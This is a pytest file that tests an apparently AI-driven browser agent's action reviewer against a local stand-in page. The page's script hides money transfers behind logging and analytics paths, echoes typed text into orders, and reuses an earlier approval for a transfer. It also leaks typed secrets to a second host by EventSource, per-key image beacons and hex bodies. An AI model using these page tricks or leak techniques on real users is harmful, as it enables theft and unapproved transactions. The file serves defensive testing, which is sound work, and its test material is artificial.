"""What a press, a choice or their typing makes a page send is judged by what it sends (web/opheld.py): no name of
an address lets a request past the reviewer, words the page builds around their own text are not theirs, a request
kept from before is judged again when what it sends changes, and their typing does not leave for another site by a
stream, a body or a query changed with each key. (2026-11-23 review of 8b57f6f: a press that posted a transfer to
/api/log/transfer or an order to /collect went with no reviewer, as statistics; ticking 公开我的资料 went with no
question; 你好 typed into a field let an order built around it pass as their words; a second press of 确定 went on
the first one's pass with a transfer in its body; typed text left by EventSource, by one image a key and by a hex
body.)

A stand-in site on 127.0.0.1 and another on localhost, in the headless browser; the reviewer is scripted and passes
only what is named in `passes`, and every card is answered no. Nothing past this computer is reached."""
from __future__ import annotations

import asyncio
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from types import SimpleNamespace
from typing import ClassVar
from urllib.parse import parse_qs, urlsplit

import pytest

from mibo import review
from mibo.web import gate, operate

pytestmark = pytest.mark.browser

PAGE = """<!doctype html><meta charset="utf-8"><title>Site</title>
<textarea id="src" aria-label="源文本"></textarea> <input id="note" aria-label="备注">
<button id="done">完成</button> <button id="ok">确定</button>
<label><input type="checkbox" id="pub"> 公开我的资料</label>
<script>
const post = (path, body) => fetch(path, {method: "POST", headers: {"Content-Type": "text/plain"}, body});
const MODE = location.hash.slice(1), OTHER = "http://localhost:PORT";
let n = 0;
done.onclick = () => {
  if (MODE == "log") post("/api/log/transfer", '{"to":"someone","amount":1000}');
  if (MODE == "collect") post("/collect", '{"order":"pro","pay":199}');
  if (MODE == "echo") post("/api/order", JSON.stringify({q: src.value, plan: "pro", pay: 199}));
};
ok.onclick = () => { n++; post("/api/action", n == 1 ? '{"do":"like"}' : '{"do":"transfer","to":"someone","amount":1000}'); };
pub.onchange = () => post("/settings/tracking", '{"public":' + pub.checked + '}');
note.addEventListener("input", () => {
  const v = note.value;
  if (MODE == "stream") new EventSource(OTHER + "/es?d=" + encodeURIComponent(v));
  if (MODE == "keys") new Image().src = OTHER + "/i?i=" + (v.length - 1) + "&c=" + encodeURIComponent(v.slice(-1));
  if (MODE == "hex") fetch(OTHER + "/h", {method: "POST", mode: "no-cors",
                                           body: [...v].map(c => c.charCodeAt(0).toString(16)).join("")});
});
</script>"""
SAID = "打开 127.0.0.1 然后将中文你好翻译成英文"  # copy: voice
SECRET = "hunter2pass"


class Site(BaseHTTPRequestHandler):
    """Both sites: the page, and every request either receives."""
    got: ClassVar[list] = []

    def do_GET(self):
        Site.got.append((self.headers.get("Host", ""), self.path, ""))
        if self.path.startswith("/es"):
            self._send(200, "text/event-stream", "data: x\n\n")
        else:
            self._send(200, "text/html; charset=utf-8", PAGE.replace("PORT", str(OTHER_PORT[0])))

    def do_POST(self):
        body = self.rfile.read(int(self.headers.get("Content-Length") or 0)).decode("utf-8", "replace")
        Site.got.append((self.headers.get("Host", ""), self.path, body))
        self._send(204, "text/plain", "")

    def do_OPTIONS(self):
        self._send(204, "text/plain", "")

    def _send(self, status: int, kind: str, text: str) -> None:
        raw = text.encode()
        self.send_response(status)
        self.send_header("Content-Type", kind)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Content-Length", str(len(raw)))
        self.end_headers()
        self.wfile.write(raw)

    def log_message(self, *args):
        pass


OTHER_PORT = [0]


def received(path: str) -> list[str]:
    return [body for _, where, body in Site.got if where.split("?")[0] == path]


def to_other() -> list[str]:
    """What reached the other site with anything in it: a value in its address, or a body."""
    return [f"{where} {body}" for host, where, body in Site.got if host.startswith("localhost") and (
        body.strip() or any(v.strip() for vs in parse_qs(urlsplit(where).query).values() for v in vs))]


@pytest.fixture
def site(tmp_path):
    from mibo import installed_browser
    try:
        from playwright.async_api import async_playwright
    except ImportError as missing:
        pytest.skip(f"no Playwright: {missing}")
    Site.got = []
    own, other = ThreadingHTTPServer(("127.0.0.1", 0), Site), ThreadingHTTPServer(("127.0.0.1", 0), Site)
    OTHER_PORT[0] = other.server_address[1]
    for server in (own, other):
        threading.Thread(target=server.serve_forever, daemon=True).start()
    loop = asyncio.new_event_loop()
    pw = loop.run_until_complete(async_playwright().start())
    found = installed_browser.find_browser()
    try:
        browser = loop.run_until_complete(pw.chromium.launch(executable_path=str(found) if found else None,
                                                             headless=True))
    except Exception as missing:
        loop.run_until_complete(pw.stop())
        pytest.skip(f"no headless browser: {missing}")
    page = loop.run_until_complete(browser.new_page())

    def run(mode: str, steps: list[dict], passes=()) -> SimpleNamespace:
        """The page at #mode, each step done in turn; the cards shown (each answered no) and the reviews asked."""
        out = SimpleNamespace(cards=[], reviews=[], results=[])

        async def ask(card):
            out.cards.append(card)
            return {"yes": False, "never": False}

        async def judge(action):
            out.reviews.append(action)
            values = " ".join((action.get("request") or {}).get("values") or [])
            return review.Verdict("go" if any(p in values for p in passes) else "ask", "stand-in", "review")
        from mibo.web.tabs import PlaywrightTab
        hands = operate.Hands(PlaywrightTab(page), ask=ask, allowed=gate.Allowed(tmp_path), attended=lambda: True,
                              review=judge, said=lambda: SAID)

        async def go():
            Site.got = []
            await page.goto(f"http://127.0.0.1:{own.server_address[1]}/#{mode}")
            await page.reload()
            await hands.look()
            for step in steps:
                step = dict(step)
                role, name = step.pop("on")
                step["id"] = next(i for i, (r, n) in hands.page.last.items() if (r, n) == (role, name))
                out.results.append(await hands.act(step))
                await asyncio.sleep(0.6)
                await hands.look()
            await hands.close()
        loop.run_until_complete(go())
        return out
    yield run
    loop.run_until_complete(browser.close())
    loop.run_until_complete(pw.stop())
    loop.close()
    for server in (own, other):
        server.shutdown()
        server.server_close()


def test_no_address_lets_a_press_past_the_reviewer(site):
    for mode, path in (("log", "/api/log/transfer"), ("collect", "/collect")):
        run = site(mode, [{"do": "click", "on": ("button", "完成")}])  # copy: voice
        assert received(path) == [], mode
        assert any((r.get("request") or {}).get("address", "").endswith(path) for r in run.reviews), mode


def test_a_choice_that_changes_a_setting_is_never_free(site):
    run = site("", [{"do": "click", "on": ("checkbox", "公开我的资料")}])  # copy: voice
    assert received("/settings/tracking") == [] and (run.reviews or run.cards)


def test_a_request_built_around_their_words_is_not_theirs(site):
    run = site("echo", [{"do": "type", "on": ("textbox", "源文本"), "text": "你好"},  # copy: voice
                        {"do": "click", "on": ("button", "完成")}])  # copy: voice
    assert received("/api/order") == [] and (run.reviews or run.cards)


def test_a_request_kept_from_before_is_judged_again_when_what_it_sends_changes(site):
    site("", [{"do": "click", "on": ("button", "确定")}, {"do": "click", "on": ("button", "确定")}],  # copy: voice
         passes=("like",))
    sent = received("/api/action")
    assert any("like" in body for body in sent) and not any("transfer" in body for body in sent)


def test_their_typing_never_leaves_for_another_site_by_a_stream_a_key_at_a_time_or_a_body(site):
    for mode in ("stream", "keys", "hex"):
        site(mode, [{"do": "type", "on": ("textbox", "备注"), "text": SECRET}])  # copy: voice
        assert to_other() == [], mode
